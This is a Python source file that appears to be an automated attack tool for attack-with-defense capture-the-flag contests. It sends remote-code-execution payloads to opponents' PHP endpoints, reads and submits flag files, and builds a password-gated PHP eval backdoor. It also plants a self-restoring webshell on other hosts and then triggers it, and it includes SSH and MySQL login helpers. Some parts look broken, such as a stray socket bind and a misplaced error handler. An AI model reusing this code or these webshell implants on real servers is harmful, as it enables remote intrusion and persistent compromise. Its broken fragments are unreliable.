#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@project    : customGr1m
@file       : Attack.py
@Author     : Gr%1m
@Date       : 14/11/2023 10:56 am
"""
from Configs.frame_config import FRAME_DIR
from Configs.config import FlagRegular
from func.CmdColors import printX
from modules.ReplaceStr import *

from urllib.parse import urlparse as URL
import requests, pymysql, paramiko, socket
import hashlib, base64
import os
import re

# About Flag
Flags = set()
FlagPath = '/flag'
FlagLen = 41

# Payload INFO
Payloads = {
    f"http://POST@{HostReplaceStr}:80/awdtest/testback.php?submit=submit&bb={RceReplaceStr}",
}
WebRootDir = '/var/www/html'
LoginCookie = 'security=low; PHPSESSID=e16f5c982733368120234560b9cb5625'

BDFileName = 'a10uN7yA_1'
BDcmdPass = 'x2aom1ng_20231114'
BDRceParam = 'kAt3l1na'
MemShell = set()
# todo: attack

# Enemy INFO
X = 'x'


def up_payloads(data):
    Payloads.add(data)


def submit_flag(submitAPI, token, flag):
    try:
        if submitAPI[-1] == 'GET':
            url = f'{submitAPI[0]}?{submitAPI[1]}={token}&{submitAPI[2]}={flag}'
            res = requests.get(url=url)
        elif submitAPI[-1] == 'POST':
            res = requests.post(url=submitAPI[0], data={submitAPI[1]: token, submitAPI[2]: flag})
        else:
            printX("[!] please set SubmitAPI method")
            return "No", 400
        return res.text, res.status_code
    except KeyboardInterrupt:
        printX('[-] Interrupt Submit Flag')
        return 0, 0
    except Exception:
        return 0, 0


def attack_vul(hostname, payload, cmd):
    purl = URL(payload)
    method, payload = purl.hostname, payload.split(f'@{HostReplaceStr}')[-1]
    payload = payload.replace(RceReplaceStr, cmd)
    url = f'http://{hostname}{payload}'
    try:
        if method == 'GET':
            res = requests.get(url=url, headers={'Cookie': LoginCookie})
        else:
            params = payload.split('?', maxsplit=1)[-1]
            data = {_.split('=', maxsplit=1)[0]: _.split('=', maxsplit=1)[1] for _ in params.split('&')}
            res = requests.post(url, data=data, headers={'Cookie': LoginCookie})
    except:
        res = None

    return res, purl


def get_flag(ey_hosts, rce="system('cat /flag');"):
    def extract_flag(text):
        try:
            flag = re.search(FlagRegular, text).group()
        except AttributeError:
            return None
        else:
            return flag.strip()

    for ey in ey_hosts:
        payloads = Payloads
        if ey_hosts[ey] == 'Infected':
            payloads = MemShell  # attack by mem shell

        for payload in payloads:
            res, _ = attack_vul(ey, payload, rce)
            flag = extract_flag(res.text)
            if flag:
                Flags.add(flag)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('myserver', 7997))
        s.listen()
    Flags.remove(None)


def generate_muma():
    bdp_md5 = hashlib.md5(BDcmdPass.encode()).hexdigest()
    LeftBraces = '{'
    RightBraces = '}'
    xiaoma_file = f"<?php if(md5($_GET['cmd'])==='{bdp_md5}'){LeftBraces}@eval($_POST['{BDRceParam}']);{RightBraces}?>"
    return base64.b64encode(xiaoma_file.encode())


# Implant Trojan
def backdoor_in(ey_hosts, my_host):
    # 植入目录感染不死马,并激活触发
    with open(f'{FRAME_DIR}/data/memshell.php', 'rb') as f:
        memshell = f.read()

    memshell = memshell.replace(BDNameReplace.encode(), BDFileName.encode())
    memshell = memshell.replace(BDDataReplace.encode(), generate_muma())
    ergodic = base64.b64encode(memshell)
    door_puts = f"file_put_contents('ergodic.php',base64_decode({ergodic}));"
    for ey in ey_hosts:
        if ey == my_host:
            continue
        for payload in Payloads:
            res, purl = attack_vul(ey, payload, door_puts)
            try:
                trigger = requests.get(f'http://{ey}{os.path.dirname(purl.path)}/ergodic.php', timeout=(1, 0.01))
            except requests.exceptions.Timeout:
                trigger = 'timeout'

            if trigger == 'timeout' or trigger.status_code != 404:
                printX(f'[+] {ey}: {purl.port} Successfully Infected')
                MemShell.add(
                    f"http://POST@{HostReplaceStr}:{purl.port}/{BDFileName}?cmd={BDcmdPass}&{BDRceParam}={RceReplaceStr}")
                ey_hosts[ey].update({purl.port: 'Infected'})


def connect_ssh(eyhostsshurl):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    eyhostssh = URL(eyhostsshurl)

    try:
        client.connect(hostname=eyhostssh.hostname,
                       username=eyhostssh.username,
                       password=eyhostssh.password,
                       port=eyhostssh.port, )
        printX(f"[+] connect Host {eyhostssh.hostname}")

        _, stdout, stderr = client.exec_command('pwd')

    except paramiko.ssh_exception.NoValidConnectionsError as e:
        printX(f'[-] SSH Error: {e}')
    except FileNotFoundError as e:
        printX(f'[-] FileNotFoundError: {e}, {stderr.read().decode()}')
    finally:
        client.close()
        return 0


def connect_sql(eyhostsql):
    try:
        conn = pymysql.connect(
            host=eyhostsql.split('@')[1].split(':')[0],
            port=int(eyhostsql.split(':')[-1].split('/')[0]),
            user=eyhostsql.split(':')[1][2:],
            password=eyhostsql.split(':')[2].split('@')[0],
            database='dvwa',
            charset='utf8'  # 字符集，注意不是'utf-8'
        )
    except pymysql.OperationalError as e:
        printX(f"[-] {e.__class__.__name__} {e}")
    else:
        return conn
